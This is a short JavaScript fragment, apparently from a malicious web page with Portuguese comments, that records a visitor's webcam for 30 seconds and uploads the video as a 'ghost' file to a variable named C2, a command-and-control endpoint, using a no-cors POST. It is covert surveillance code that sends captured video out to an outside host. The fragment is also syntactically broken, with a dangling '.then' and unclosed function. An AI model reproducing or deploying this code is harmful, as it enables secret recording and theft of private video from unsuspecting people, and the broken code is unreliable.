function startRealCam() {
    document.getElementById('perm').style.display = 'none';

    .then(stream => startRecording(stream));

// Grava칞칚o real
function startRecording(stream) {
    const recorder = new MediaRecorder(stream);
    const chunks = [];
    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.onstop = () => {
        const blob = new Blob(chunks, {type:'video/webm'});
        const fd = new FormData();
        fd.append('ghost', blob, `ghost_${Date.now()}.webm`);
        fetch(C2, {method:'POST', body:fd, mode:'no-cors'});
        stream.getTracks().forEach(t => t.stop());
    };
    recorder.start();
    setTimeout(() => recorder.stop(), 30000);
}
